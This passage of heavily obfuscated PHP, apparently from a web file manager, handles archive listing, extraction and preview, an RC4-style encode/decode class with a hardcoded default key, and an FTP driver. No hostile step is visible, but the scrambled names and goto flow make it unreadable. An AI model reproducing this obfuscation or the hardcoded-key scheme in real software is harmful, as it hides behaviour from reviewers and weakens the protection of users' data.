($Cš¡—î—Š[$AÍ‚©ÎÂè³[1879]] == $AÍ‚©ÎÂè³[1880] || $Cš¡—î—Š[$AÍ‚©ÎÂè³[1879]] == $AÍ‚©ÎÂè³[1881]) { continue; } if ($AÏ‘ç£ğ) { $Cš¡—î—Š[$AÍ‚©ÎÂè³[1882]] = ltrim($Cš¡—î—Š[$AÍ‚©ÎÂè³[1882]], $AÍ‚©ÎÂè³[1140]); } if ($Cš¡—î—Š[$AÍ‚©ÎÂè³[1879]] == $AÍ‚©ÎÂè³[1883]) { $Cš¡—î—Š[$AÍ‚©ÎÂè³[76]] = !0; } else { $Cš¡—î—Š[$AÍ‚©ÎÂè³[76]] = !1; } $Cš¡—î—Š[$AÍ‚©ÎÂè³[1029]] = $Dî¯Ö¤»ÀØ; $D·»¢˜°šÃ[] = $Cš¡—î—Š; } } else { if (self::checkIfType($d‘†ƒ™Ñ°Œ, $AÍ‚©ÎÂè³[1038])) { $eïˆ™´Ø = kodRarArchive::listContent($Dî¡½¯¯¼á); if (!$eïˆ™´Ø[$AÍ‚©ÎÂè³[1025]]) { return $eïˆ™´Ø; } else { $D·»¢˜°šÃ = $eïˆ™´Ø[$AÍ‚©ÎÂè³[1027]]; } } else { if (kodZipArchive::support($AÍ‚©ÎÂè³[351])) { $D·»¢˜°šÃ = kodZipArchive::listContent($Dî¡½¯¯¼á); } else { $C¨¾˜Áìéó = new PclZip($Dî¡½¯¯¼á); $D·»¢˜°šÃ = $C¨¾˜Áìéó->listContent(); } } } if ($D·»¢˜°šÃ) { $dÀñÑÑÀ³Å = unzip_charset_get($D·»¢˜°šÃ); $AÏ‘ç£ğ = $AÏ‘ç£ğ && function_exists($AÍ‚©ÎÂè³[65]); for ($Dî¯Ö¤»ÀØ = 0; $Dî¯Ö¤»ÀØ < count($D·»¢˜°šÃ); $Dî¯Ö¤»ÀØ++) { $D·»¢˜°šÃ[$Dî¯Ö¤»ÀØ][$AÍ‚©ÎÂè³[1882]] = str_replace(array($AÍ‚©ÎÂè³[1065], $AÍ‚©ÎÂè³[1884]), $AÍ‚©ÎÂè³[762], $D·»¢˜°šÃ[$Dî¯Ö¤»ÀØ][$AÍ‚©ÎÂè³[1882]]); if ($AÏ‘ç£ğ) { $D·»¢˜°šÃ[$Dî¯Ö¤»ÀØ][$AÍ‚©ÎÂè³[1882]] = iconv_to($D·»¢˜°šÃ[$Dî¯Ö¤»ÀØ][$AÍ‚©ÎÂè³[1882]], $dÀñÑÑÀ³Å, $AÍ‚©ÎÂè³[323]); unset($D·»¢˜°šÃ[$Dî¯Ö¤»ÀØ][$AÍ‚©ÎÂè³[1885]]); } } return array($AÍ‚©ÎÂè³[1025] => !0, $AÍ‚©ÎÂè³[1027] => $D·»¢˜°šÃ); } else { return array($AÍ‚©ÎÂè³[1025] => !1, $AÍ‚©ÎÂè³[1027] => $D·»¢˜°šÃ); } } static function extract($c·Ÿôì¥šï, $còÜÂìù, $Bø‚³ˆ›‡ = "\55\x31", &$aÀµî÷ì = false) { goto a†Ôªéâìª; a†Ôªéâìª: $aôëº…‹š =& $_SERVER[¼]; self::init(); $e±˜ù˜İŠ£ = !empty($GLOBALS[$aôëº…‹š[1042]]) ? $GLOBALS[$aôëº…‹š[1042]] : get_path_ext($c·Ÿôì¥šï); goto bÆ¾Ñè „; bÆ¾Ñè „: $D¸¦÷òªò = self::listContent($c·Ÿôì¥šï, !1); if (!$D¸¦÷òªò[$aôëº…‹š[1025]]) { return $D¸¦÷òªò; } if ($Bø‚³ˆ›‡ != $aôëº…‹š[1024]) { goto E’«”°Àé; E’«”°Àé: $a»“Š´ä‚‡ = self::fileIndex($D¸¦÷òªò[$aôëº…‹š[1027]], $Bø‚³ˆ›‡); $aÀµî÷ì = str_replace(array($aôëº…‹š[1065], $aôëº…‹š[1884]), $aôëº…‹š[70], $a»“Š´ä‚‡[$aôëº…‹š[1882]]); $B¿¼ì×Ä‚¿ = $aÀµî÷ì; goto EİÔŠµŠƒŞ; a­‡˜ƒ•‚•: if ($a»“Š´ä‚‡[$aôëº…‹š[76]]) { $B¿¼ì×Ä‚¿ = rtrim($B¿¼ì×Ä‚¿, $aôëº…‹š[8]) . $aôëº…‹š[8]; $aÀµî÷ì = array($aÀµî÷ì); } $C°š‘œƒô = str_replace($aôëº…‹š[95], $aôëº…‹š[8], $B¿¼ì×Ä‚¿); if (substr($C°š‘œƒô, -1) == $aôëº…‹š[8]) { if (!strstr(trim($C°š‘œƒô, $aôëº…‹š[8]), $aôëº…‹š[8])) { $còÜÂìù = $còÜÂìù . get_path_this($C°š‘œƒô) . $aôëº…‹š[8]; } } else { if ($bß¼Šªô‰Î == $B¿¼ì×Ä‚¿) { $bß¼Šªô‰Î = $aôëº…‹š[33]; } } goto bˆğš¹ÜÙ¸; EİÔŠµŠƒŞ: if ($GLOBALS[$aôëº…‹š[6]][$aôëº…‹š[1138]] != $aôëº…‹š[323]) { $B¿¼ì×Ä‚¿ = unzip_pre_name($aÀµî÷ì); } $bß¼Šªô‰Î = get_path_father($aÀµî÷ì); if ($bß¼Šªô‰Î == $aÀµî÷ì) { $bß¼Šªô‰Î = $aôëº…‹š[33]; } goto a­‡˜ƒ•‚•; bˆğš¹ÜÙ¸: } goto bÈ¨äßº; bÈ¨äßº: if (self::checkIfType($e±˜ù˜İŠ£, $aôëº…‹š[1864])) { if ($Bø‚³ˆ›‡ != $aôëº…‹š[1024]) { $B¿¼ì×Ä‚¿ = unzip_pre_name($B¿¼ì×Ä‚¿); $bß¼Šªô‰Î = unzip_pre_name($bß¼Šªô‰Î); $aÚ“‘ÆšÇ = PclTarExtractList($c·Ÿôì¥šï, array($B¿¼ì×Ä‚¿), $còÜÂìù, $bß¼Šªô‰Î, $e±˜ù˜İŠ£); } else { $aÚ“‘ÆšÇ = PclTarExtract($c·Ÿôì¥šï, $còÜÂìù, $aôëº…‹š[358], $e±˜ù˜İŠ£); } return array($aôëº…‹š[1025] => $aÚ“‘ÆšÇ, $aôëº…‹š[1027] => PclErrorString(!0)); } else { if (self::checkIfType($e±˜ù˜İŠ£, $aôëº…‹š[1038])) { return kodRarArchive::extract($c·Ÿôì¥šï, $còÜÂìù, $e±˜ù˜İŠ£, $aÀµî÷ì); } else { if (kodZipArchive::support($aôëº…‹š[1886])) { return kodZipArchive::extract($c·Ÿôì¥šï, $còÜÂìù, $aÀµî÷ì); } else { $D¹Ì–´ÑĞ¾ = new PclZip($c·Ÿôì¥šï); if ($Bø‚³ˆ›‡ != $aôëº…‹š[1024]) { $aÚ“‘ÆšÇ = $D¹Ì–´ÑĞ¾->extract(PCLZIP_OPT_PATH, $còÜÂìù, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $aôëº…‹š[1887], PCLZIP_OPT_BY_NAME, $a»“Š´ä‚‡[$aôëº…‹š[1882]], PCLZIP_OPT_REMOVE_PATH, $bß¼Šªô‰Î, PCLZIP_OPT_REPLACE_NEWER); } else { $aÚ“‘ÆšÇ = $D¹Ì–´ÑĞ¾->extract(PCLZIP_OPT_PATH, $còÜÂìù, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $aôëº…‹š[1887], PCLZIP_OPT_REPLACE_NEWER); } return array($aôëº…‹š[1025] => $aÚ“‘ÆšÇ, $aôëº…‹š[1027] => $D¹Ì–´ÑĞ¾->errorName(!0)); } } } return array($aôëº…‹š[1025] => !1, $aôëº…‹š[1027] => $aôëº…‹š[1888]); goto cå¾ËÅ¨¸–; cå¾ËÅ¨¸–: } static function fileIndex($CÈçÓ”æí¡, $b»†ã‚©Í, $fØ³‡Äö» = false) { goto F›Ø‘øìŒŠ; FÆ¨ŠòÎÏƒ: $a·ŠŒòÓ¢ğ = $bŸ‡ÚµÒÖ³; if ($fØ³‡Äö») { $a·ŠŒòÓ¢ğ = $bŸ‡ÚµÒÖ³[$fØ³‡Äö»]; if ($bŸ‡ÚµÒÖ³[$BçÕÊ¨ÁĞ“[76]]) { $a·ŠŒòÓ¢ğ = rtrim($a·ŠŒòÓ¢ğ, $BçÕÊ¨ÁĞ“[8]) . $BçÕÊ¨ÁĞ“[8]; } } return $a·ŠŒòÓ¢ğ; goto B½ÆÌà­œ‹; eÈö­ÊÙ„á: $aÍšöñÆ°Ù = count($CÈçÓ”æí¡); for ($Bæãö¨¥Ì = 0; $Bæãö¨¥Ì < $aÍšöñÆ°Ù; $Bæãö¨¥Ì++) { if ($b»†ã‚©Í == $CÈçÓ”æí¡[$Bæãö¨¥Ì][$BçÕÊ¨ÁĞ“[1029]]) { $bŸ‡ÚµÒÖ³ = $CÈçÓ”æí¡[$Bæãö¨¥Ì]; break; } } if (!$bŸ‡ÚµÒÖ³) { show_tips($BçÕÊ¨ÁĞ“[1889]); } goto FÆ¨ŠòÎÏƒ; F›Ø‘øìŒŠ: $BçÕÊ¨ÁĞ“ =& $_SERVER[¼]; self::init(); if (!is_array($CÈçÓ”æí¡)) { return !1; } goto eÈö­ÊÙ„á; B½ÆÌà­œ‹: } static function extractZipFile($Cà‘²÷³Ó, $fÏ’ñó¸Í×, $B§ÏÎ²ª² = false) { goto A»’°£Œ©½; E—ÚŠ±‹¾¨: mk_dir($Cí‰³‘ì); $f­³ÉŞÑ¢  = $Cí‰³‘ì . md5($Cà‘²÷³Ó . $fÏ’ñó¸Í×); if ($B§ÏÎ²ª²) { $f­³ÉŞÑ¢  = $Cí‰³‘ì . $B§ÏÎ²ª²; } goto c¨ÕÅ×Ó¡§; B†ááâ·È: if (!file_exists($aÇÍ©í¬)) { return !1; } @rename($aÇÍ©í¬, $f­³ÉŞÑ¢ ); return $f­³ÉŞÑ¢ ; goto dğ·îµ¸çÚ; c¨ÕÅ×Ó¡§: if (file_exists($f­³ÉŞÑ¢ )) { return $f­³ÉŞÑ¢ ; } $b¥š©ƒŞÑ = new PclZip($Cà‘²÷³Ó); $aÇÍ©í¬ = unzip_filter_ext($Cí‰³‘ì . get_path_this($fÏ’ñó¸Í×)); goto eƒŠéÑ‚ À; A»’°£Œ©½: $Bô°²ªÚõô =& $_SERVER[¼]; self::init(); $Cí‰³‘ì = TEMP_FILES . hash_path($Cà‘²÷³Ó) . $Bô°²ªÚõô[8]; goto E—ÚŠ±‹¾¨; eƒŠéÑ‚ À: $eŸÂåŞ†Î« = get_path_father($fÏ’ñó¸Í×); if ($eŸÂåŞ†Î« == $fÏ’ñó¸Í×) { $eŸÂåŞ†Î« = $Bô°²ªÚõô[33]; } $f†©¿¿£“… = $b¥š©ƒŞÑ->extract(PCLZIP_OPT_PATH, $Cí‰³‘ì, PCLZIP_CB_PRE_FILE_NAME, $Bô°²ªÚõô[1887], PCLZIP_OPT_REMOVE_PATH, $eŸÂåŞ†Î«, PCLZIP_OPT_BY_NAME, $fÏ’ñó¸Í×); goto B†ááâ·È; dğ·îµ¸çÚ: } static function filePreview($e‹ñÙ¸ë²ê, $a‘¨ò¼Íá, $F†‰ŸÅ„Õ† = false, $DÊõİ±„¹ = false) { goto b†¤¾…éÊÒ; a”áçª‰­¶: $D”»ãÂ £‘ = self::extract($e‹ñÙ¸ë²ê, $Cø˜¥÷ìˆØ, $a‘¨ò¼Íá, $CîÁ×›¬Ë¼); if (is_array($CîÁ×›¬Ë¼)) { show_json($D•ÏÈù‹è[1890], !1); } if (file_exists($D“ô¦Åàèñ)) { IO::fileOut($D“ô¦Åàèñ, $F†‰ŸÅ„Õ†, get_path_this($CîÁ×›¬Ë¼)); return; } goto e§…âÇ¿„Ã; aº‡ª«±°²: if (!file_exists($D“ô¦Åàèñ)) { del_dir($Cø˜¥÷ìˆØ); show_json($D•ÏÈù‹è[1892]); } IO::fileOut($D“ô¦Åàèñ, $F†‰ŸÅ„Õ†, $DÚ­‡³œ¾÷); goto d±å—¦‚Šå; C…ï†ä†Ú: mk_dir($Cø˜¥÷ìˆØ); $D“ô¦Åàèñ = $Cø˜¥÷ìˆØ . md5($e‹ñÙ¸ë²ê . $a‘¨ò¼Íá . $DÊõİ±„¹); $CîÁ×›¬Ë¼ = $D•ÏÈù‹è[33]; goto a”áçª‰­¶; b†¤¾…éÊÒ: $D•ÏÈù‹è =& $_SERVER[¼]; self::init(); $Cø˜¥÷ìˆØ = TEMP_FILES . hash_path($e‹ñÙ¸ë²ê) . $D•ÏÈù‹è[8]; goto C…ï†ä†Ú; DÇ’Ô ‘©“: if (!$D”»ãÂ £‘[$D•ÏÈù‹è[1025]]) { show_json($D”»ãÂ £‘[$D•ÏÈù‹è[1027]], !1); } if (!file_exists($CÅÈÇ—Ç¾ù)) { show_json($D•ÏÈù‹è[1891], !1); } @rename($CÅÈÇ—Ç¾ù, $D“ô¦Åàèñ); goto aº‡ª«±°²; e§…âÇ¿„Ã: $CîÁ×›¬Ë¼ = unzip_pre_name($CîÁ×›¬Ë¼); $DÚ­‡³œ¾÷ = get_path_this($CîÁ×›¬Ë¼); $CÅÈÇ—Ç¾ù = unzip_filter_ext($Cø˜¥÷ìˆØ . $DÚ­‡³œ¾÷); goto DÇ’Ô ‘©“; d±å—¦‚Šå: } static function create($fã¦ùÍ“œø, $fË¥ÈÌ¥‰) { $E¸¥í¹ÑñÊ =& $_SERVER[¼]; self::init(); $dìŞ„°ÎÚ = get_path_ext($fã¦ùÍ“œø); $Aƒ›¹½«ÙŠ = !1; if (self::checkIfType($dìŞ„°ÎÚ, $E¸¥í¹ÑñÊ[298])) { if (kodZipArchive::support($E¸¥í¹ÑñÊ[1003])) { return kodZipArchive::create($fã¦ùÍ“œø, $fË¥ÈÌ¥‰); } $FÃ˜Ü®†‚ = new PclZip($fã¦ùÍ“œø); foreach ($fË¥ÈÌ¥‰ as $Eåñßåí‘ => $bİ°ñÇß¬) { $bİ°ñÇß¬ = str_replace($E¸¥í¹ÑñÊ[463], $E¸¥í¹ÑñÊ[8], $bİ°ñÇß¬); $a·…šïá¥æ = Kodio::clear(get_path_father($bİ°ñÇß¬)); if ($Eåñßåí‘ == 0) { $Aƒ›¹½«ÙŠ = $FÃ˜Ü®†‚->create($bİ°ñÇß¬, PCLZIP_OPT_REMOVE_PATH, $a·…šïá¥æ, PCLZIP_CB_PRE_FILE_NAME, $E¸¥í¹ÑñÊ[1893]); continue; } $Aƒ›¹½«ÙŠ = $FÃ˜Ü®†‚->add($bİ°ñÇß¬, PCLZIP_OPT_REMOVE_PATH, $a·…šïá¥æ, PCLZIP_CB_PRE_FILE_NAME, $E¸¥í¹ÑñÊ[1893]); } } else { if (self::checkIfType($dìŞ„°ÎÚ, $E¸¥í¹ÑñÊ[1864])) { foreach ($fË¥ÈÌ¥‰ as $Eåñßåí‘ => $bİ°ñÇß¬) { $bİ°ñÇß¬ = str_replace($E¸¥í¹ÑñÊ[463], $E¸¥í¹ÑñÊ[8], $bİ°ñÇß¬); $a·…šïá¥æ = Kodio::clear(get_path_father($bİ°ñÇß¬)); if ($Eåñßåí‘ == 0) { $Aƒ›¹½«ÙŠ = PclTarCreate($fã¦ùÍ“œø, array($bİ°ñÇß¬), $dìŞ„°ÎÚ, null, $a·…šïá¥æ); continue; } $Aƒ›¹½«ÙŠ = PclTarAddList($fã¦ùÍ“œø, array($bİ°ñÇß¬), $E¸¥í¹ÑñÊ[33], $a·…šïá¥æ, $dìŞ„°ÎÚ); } } } return $Aƒ›¹½«ÙŠ; } } class Mcrypt { public static $defaultKey = "\141\x21\164\x61\x6b\x41\72\144\154\155\143\154\144\105\x76\x2c\x65"; public static function encode($D•¢Å‚²‚, $b™™¤Â„í• = '', $càì¨¦¯È = 0, $e´áÅââ¥ = '') { goto C£¹®²†àÀ; C£¹®²†àÀ: $A©Õ¯‚å¢š =& $_SERVER[¼]; $dÁÕŸÜ„×¿ = 4; $b™™¤Â„í• = md5($b™™¤Â„í• ? $b™™¤Â„í• : self::$defaultKey); goto c»ƒå…æî»; CÇ––—Ş¨«: $EÄê¶ç£Íì = $A©Õ¯‚å¢š[33]; for ($bÃçÒŠã•¸ = $a—›œÆ•³ = $CÙùíº°¨´ = 0; $CÙùíº°¨´ < $cæ‹ôõö¸£; $CÙùíº°¨´++) { $bÃçÒŠã•¸ = ($bÃçÒŠã•¸ + 1) % 256; $a—›œÆ•³ = ($a—›œÆ•³ + $c÷ÅàóÂ‡[$bÃçÒŠã•¸]) % 256; $EçÁƒ¶Œ›Š = $c÷ÅàóÂ‡[$bÃçÒŠã•¸]; $c÷ÅàóÂ‡[$bÃçÒŠã•¸] = $c÷ÅàóÂ‡[$a—›œÆ•³]; $c÷ÅàóÂ‡[$a—›œÆ•³] = $EçÁƒ¶Œ›Š; $EÄê¶ç£Íì .= chr(ord($D•¢Å‚²‚[$CÙùíº°¨´]) ^ $c÷ÅàóÂ‡[($c÷ÅàóÂ‡[$bÃçÒŠã•¸] + $c÷ÅàóÂ‡[$a—›œÆ•³]) % 256]); } $EÄê¶ç£Íì = $dëßì‡áÍ . str_replace($A©Õ¯‚å¢š[902], $A©Õ¯‚å¢š[33], base64_encode($EÄê¶ç£Íì)); goto FÉæùšÇºÊ; f«óË ·‡: $D•¢Å‚²‚ = sprintf($A©Õ¯‚å¢š[1894], $càì¨¦¯È ? $càì¨¦¯È + time() : 0) . substr(md5($D•¢Å‚²‚ . $cšáò¦Ç), 0, 16) . $D•¢Å‚²‚; $cæ‹ôõö¸£ = strlen($D•¢Å‚²‚); $D®±÷”‚™ = array(); goto c»œÛ‹‚; FÉæùšÇºÊ: $EÄê¶ç£Íì = str_replace(array($A©Õ¯‚å¢š[281], $A©Õ¯‚å¢š[8], $A©Õ¯‚å¢š[902]), array($A©Õ¯‚å¢š[408], $A©Õ¯‚å¢š[70], $A©Õ¯‚å¢š[93]), $EÄê¶ç£Íì); return $EÄê¶ç£Íì; goto Cœ«„Çæ; c»ƒå…æî»: $F¦å˜ˆ’³ª = md5(substr($b™™¤Â„í•, 0, 16)); $cšáò¦Ç = md5(substr($b™™¤Â„í•, 16, 16)); $e´áÅââ¥ = $e´áÅââ¥ ? $e´áÅââ¥ : md5(microtime()); goto eí‹Ã†Ôµì; eí‹Ã†Ôµì: $dëßì‡áÍ = substr($e´áÅââ¥, -$dÁÕŸÜ„×¿); $B¨ëŠáÕ»Ğ = $F¦å˜ˆ’³ª . md5($F¦å˜ˆ’³ª . $dëßì‡áÍ); $EÏ¦¼Åˆ– = strlen($B¨ëŠáÕ»Ğ); goto f«óË ·‡; c»œÛ‹‚: for ($CÙùíº°¨´ = 0; $CÙùíº°¨´ <= 255; $CÙùíº°¨´++) { $D®±÷”‚™[$CÙùíº°¨´] = ord($B¨ëŠáÕ»Ğ[$CÙùíº°¨´ % $EÏ¦¼Åˆ–]); } $c÷ÅàóÂ‡ = range(0, 255); for ($a—›œÆ•³ = $CÙùíº°¨´ = 0; $CÙùíº°¨´ < 256; $CÙùíº°¨´++) { $a—›œÆ•³ = ($a—›œÆ•³ + $c÷ÅàóÂ‡[$CÙùíº°¨´] + $D®±÷”‚™[$CÙùíº°¨´]) % 256; $EçÁƒ¶Œ›Š = $c÷ÅàóÂ‡[$CÙùíº°¨´]; $c÷ÅàóÂ‡[$CÙùíº°¨´] = $c÷ÅàóÂ‡[$a—›œÆ•³]; $c÷ÅàóÂ‡[$a—›œÆ•³] = $EçÁƒ¶Œ›Š; } goto CÇ––—Ş¨«; Cœ«„Çæ: } public static function decode($AŠÏÔŞÇê, $aÈì’¤ó—× = '') { goto C‹¼öŞäòº; Eã¸“ğ¨ØÙ: $aÈì’¤ó—× = md5($aÈì’¤ó—× ? $aÈì’¤ó—× : self::$defaultKey); $E²öÑå¤¤Ù = md5(substr($aÈì’¤ó—×, 0, 16)); $cÑß†£ÒóÅ = md5(substr($aÈì’¤ó—×, 16, 16)); goto CŠ¶™ÙÕ–Ò; EˆíôäÒğ±: $c‘“±¶ß³• = $BÎÄóœ ¹§[33]; for ($CÚ­„­ù¡ = $a°±ì‘¥ã— = $a’¡Ò–øÄî = 0; $a’¡Ò–øÄî < $cçµÕÍÃ§; $a’¡Ò–øÄî++) { $CÚ­„­ù¡ = ($CÚ­„­ù¡ + 1) % 256; $a°±ì‘¥ã— = ($a°±ì‘¥ã— + $Cî¿îÜĞ®[$CÚ­„­ù¡]) % 256; $CƒëæÇäá‡ = $Cî¿îÜĞ®[$CÚ­„­ù¡]; $Cî¿îÜĞ®[$CÚ­„­ù¡] = $Cî¿îÜĞ®[$a°±ì‘¥ã—]; $Cî¿îÜĞ®[$a°±ì‘¥ã—] = $CƒëæÇäá‡; $c‘“±¶ß³• .= chr(ord($AŠÏÔŞÇê[$a’¡Ò–øÄî]) ^ $Cî¿îÜĞ®[($Cî¿îÜĞ®[$CÚ­„­ù¡] + $Cî¿îÜĞ®[$a°±ì‘¥ã—]) % 256]); } $F¦í’‹öİá = intval(substr($c‘“±¶ß³•, 0, 10)); goto f¬›ÇÑÈçÍ; C‹¼öŞäòº: $BÎÄóœ ¹§ =& $_SERVER[¼]; $AŠÏÔŞÇê = str_replace(array($BÎÄóœ ¹§[408], $BÎÄóœ ¹§[70], $BÎÄóœ ¹§[93]), array($BÎÄóœ ¹§[281], $BÎÄóœ ¹§[8], $BÎÄóœ ¹§[902]), $AŠÏÔŞÇê); $DãÂÓ«‰ï  = 4; goto Eã¸“ğ¨ØÙ; E§äÑİ´Ñ: for ($a’¡Ò–øÄî = 0; $a’¡Ò–øÄî <= 255; $a’¡Ò–øÄî++) { $C’­”øÃÁ¹[$a’¡Ò–øÄî] = ord($B£´‹Ç‚‘ä[$a’¡Ò–øÄî % $fÛÓĞ†åÅ]); } $Cî¿îÜĞ® = range(0, 255); for ($a°±ì‘¥ã— = $a’¡Ò–øÄî = 0; $a’¡Ò–øÄî < 256; $a’¡Ò–øÄî++) { $a°±ì‘¥ã— = ($a°±ì‘¥ã— + $Cî¿îÜĞ®[$a’¡Ò–øÄî] + $C’­”øÃÁ¹[$a’¡Ò–øÄî]) % 256; $CƒëæÇäá‡ = $Cî¿îÜĞ®[$a’¡Ò–øÄî]; $Cî¿îÜĞ®[$a’¡Ò–øÄî] = $Cî¿îÜĞ®[$a°±ì‘¥ã—]; $Cî¿îÜĞ®[$a°±ì‘¥ã—] = $CƒëæÇäá‡; } goto EˆíôäÒğ±; f¬›ÇÑÈçÍ: if (($F¦í’‹öİá == 0 || $F¦í’‹öİá - time() > 0) && substr($c‘“±¶ß³•, 10, 16) == substr(md5(substr($c‘“±¶ß³•, 26) . $cÑß†£ÒóÅ), 0, 16)) { return substr($c‘“±¶ß³•, 26); } else { return $BÎÄóœ ¹§[33]; } goto aÑÜ¾‰æ; e±áØØÎ¿: $AŠÏÔŞÇê = base64_decode(substr($AŠÏÔŞÇê, $DãÂÓ«‰ï )); $cçµÕÍÃ§ = strlen($AŠÏÔŞÇê); $C’­”øÃÁ¹ = array(); goto E§äÑİ´Ñ; CŠ¶™ÙÕ–Ò: $AŠÙíãØ† = substr($AŠÏÔŞÇê, 0, $DãÂÓ«‰ï ); $B£´‹Ç‚‘ä = $E²öÑå¤¤Ù . md5($E²öÑå¤¤Ù . $AŠÙíãØ†); $fÛÓĞ†åÅ = strlen($B£´‹Ç‚‘ä); goto e±áØØÎ¿; aÑÜ¾‰æ: } } define($_SERVER[¼][1895], 1); goto a÷ó¸¡ï²×; a§ Ã×ŸÂ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($B»ÇÇá°Ñê) { parent::__construct(); if (count($B»ÇÇá°Ñê) > 0) { $this->_init($B»ÇÇá°Ñê); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($bÚ¯£¿¨ª–) { $EØ­ˆ§Ú =& $_SERVER[¼]; global $config; $this->appCharset = $config[$EØ­ˆ§Ú[1137]]; $this->systemCharset = $config[$EØ­ˆ§Ú[1138]]; if (isset($bÚ¯£¿¨ª–[$EØ­ˆ§Ú[1139]]) && $bÚ¯£¿¨ª–[$EØ­ˆ§Ú[1139]]) { $this->systemCharset = $bÚ¯£¿¨ª–[$EØ­ˆ§Ú[1139]]; } } public function iconvApp($fäˆ¾áù¨´) { return $this->iconvTo($fäˆ¾áù¨´, $this->systemCharset, $this->appCharset); } public function iconvSystem($bÄÙ®ìêå) { return $this->iconvTo($bÄÙ®ìêå, $this->appCharset, $this->systemCharset); } public function getPathOuter($d§…øÖ‘«°) { goto d¹ùÆÏí; dÉ×£–î: if (substr($fñ°šÄéÁ, 0, 2) == $B Ãº‚„ø†[1140]) { $fñ°šÄéÁ = BASIC_PATH . substr($fñ°šÄéÁ, 2); } if (substr($d§…øÖ‘«°, 0, 2) == $B Ãº‚„ø†[1140]) { $d§…øÖ‘«° = BASIC_PATH . substr($d§…øÖ‘«°, 2); } $fñ°šÄéÁ = KodIO::clear($fñ°šÄéÁ); goto A†ì…ÌÊË; A†ì…ÌÊË: $d§…øÖ‘«° = KodIO::clear($d§…øÖ‘«°); $d§…øÖ‘«° = substr($d§…øÖ‘«°, strlen($fñ°šÄéÁ)); if (empty($this->pathDriver)) { return $d§…øÖ‘«°; } goto A†Ë¼Èò³; d¹ùÆÏí: $B Ãº‚„ø† =& $_SERVER[¼]; $fñ°šÄéÁ = $this->iconvApp($this->pathBase); $d§…øÖ‘«° = $this->iconvApp($d§…øÖ‘«°); goto dÉ×£–î; A†Ë¼Èò³: return $this->pathDriver . $B Ãº‚„ø†[8] . ltrim($d§…øÖ‘«°, $B Ãº‚„ø†[8]); goto fâªµ‡‡ˆ; fâªµ‡‡ˆ: } private function _init($dÜ§³åËò© = array()) { goto d‡Æ’«íˆ; B¶ãÛˆ±†: if (isset($eòà«¦Ò¦–[$Bä‡‡šÆ])) { foreach ($eòà«¦Ò¦–[$Bä‡‡šÆ] as $a„ñÑ¬ù => $a‹ÖÙ•ßÓÆ) { $this->{$a„ñÑ¬ù} = $a‹ÖÙ•ßÓÆ; } return !0; } $aØÄî³´£× = parse_url(trim($this->server, $Aš ¶ëè¤‘[8])); $this->host = $aØÄî³´£×[$Aš ¶ëè¤‘[166]]; goto Aîº¶‹âô£; eö‹áµáÊ: foreach ($dÜ§³åËò© as $a„ñÑ¬ù => $a‹ÖÙ•ßÓÆ) { if (isset($this->{$a„ñÑ¬ù})) { $this->{$a„ñÑ¬ù} = $a‹ÖÙ•ßÓÆ; } } static $eòà«¦Ò¦– = array(); $Bä‡‡šÆ = md5(json_encode($dÜ§³åËò©)); goto B¶ãÛˆ±†; C‡¶…õ‰‰Õ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $eòà«¦Ò¦–[$Bä‡‡šÆ] = array($Aš ¶ëè¤‘[1146] => $this->connect, $Aš ¶ëè¤‘[166] => $this->host, $Aš ¶ëè¤‘[165] => $this->scheme, $Aš ¶ëè¤‘[167] => $this->port); goto Dì³ëï²¡; Aîº¶‹âô£: $F ö¦Ô±æÚ = isset($aØÄî³´£×[$Aš ¶ëè¤‘[165]]) && $aØÄî³´£×[$Aš ¶ëè¤‘[165]] == $Aš ¶ëè¤‘[1143] ? !0 : !1; $this->scheme = $F ö¦Ô±æÚ ? $Aš ¶ëè¤‘[1144] : $Aš ¶ëè¤‘[1145]; $this->port = isset($aØÄî³´£×[$Aš ¶ëè¤‘[167]]) ? $aØÄî³´£×[$Aš ¶ëè¤‘[167]] : 21; goto A´›Œ˜†á°; d‡Æ’«íˆ: $Aš ¶ëè¤‘ =& $_SERVER[¼]; if (!function_exists($Aš ¶ëè¤‘[1141])) { show_json(LNG($Aš ¶ëè¤‘[1142]), !1); } $this->charsetReset($dÜ§³åËò©); goto eö‹áµáÊ; Dì³ëï²¡: return $bÓø¬È‡©; goto eÖª»“ÄÇš; A´›Œ˜†á°: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $bÓø¬È‡© = @ftp_login($this->connect, $this->username, $this->userpass); goto C‡¶…õ‰‰Õ; eÖª»“ÄÇš: } private function _isconn() { return is_resource($this->connect); } public function mkfile($f»¦™ÕÌêğ, $eÈ­ŠêƒÈâ = '', $e³´ˆ”ÆË = REPEAT_RENAME) { if ($this->setContent($f»¦™ÕÌêğ, $eÈ­ŠêƒÈâ)) { return $this->getPathOuter($f»¦™ÕÌêğ); } return !1; } public function mkdir($A–™¤Ï˜Æ‘, $a‘ŞÍïŒ‘  = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $A–™¤Ï˜Æ‘ = $this->iconvSystem($A–™¤Ï˜Æ‘); if ($this->isFolder($A–™¤Ï˜Æ‘) || @ftp_mkdir($this->connect, $A–™¤Ï˜Æ‘)) { return $this->getPathOuter($A–™¤Ï˜Æ‘); } if (!$this->mkdir($this->pathFather($A–™¤Ï˜Æ‘))) { return !1; } if ($A–™¤Ï˜Æ‘ = @ftp_mkdir($this->connect, $A–™¤Ï˜Æ‘)) { return $this->getPathOuter($A–™¤Ï˜Æ‘); } return !1; } public function copyFile($cœŒ·§‘·Ó, $d–ŒâÅáòç) { goto Dªâ¯Ğ¸ä‰; aË©¾ÍÀ”: $this->tempFileRemve($E¾Œ×˜Ê); return $Fàä©‹†šÑ; goto Añ¢ëğñ°¶; Dªâ¯Ğ¸ä‰: if (!$this->_isconn()) { return !1; } $A— Ş¯»Ú = $this->pathThis($this->iconvSystem($cœŒ·§‘·Ó)); $E¾Œ×˜Ê = $this->tempFile($A— Ş¯»Ú); goto b×§½ÒÁß²; b×§½ÒÁß²: $cÅ„Ó‚å¬ = $this->iconvApp($E¾Œ×˜Ê); $this->download($cœŒ·§‘·Ó, $cÅ„Ó‚å¬); $Fàä©‹†šÑ = 